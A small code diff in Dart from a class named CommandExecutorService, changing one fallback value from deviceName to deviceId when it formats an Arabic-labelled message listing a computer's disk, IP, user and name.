@@ -1607,7 +1607,7 @@ class CommandExecutorService {
             final disk = decodedSpecs['FreeDisk_GB'] ?? '?';
             final ip = decodedSpecs['IP'] ?? '?';
             final user = decodedSpecs['User'] ?? '?';
-            final comp = decodedSpecs['Computer'] ?? deviceName;
+            final comp = decodedSpecs['Computer'] ?? deviceId;
 
             success = true;
             message = '🖥️ <b>مواصفات ومعلومات الكمبيوتر:</b>\n\n'
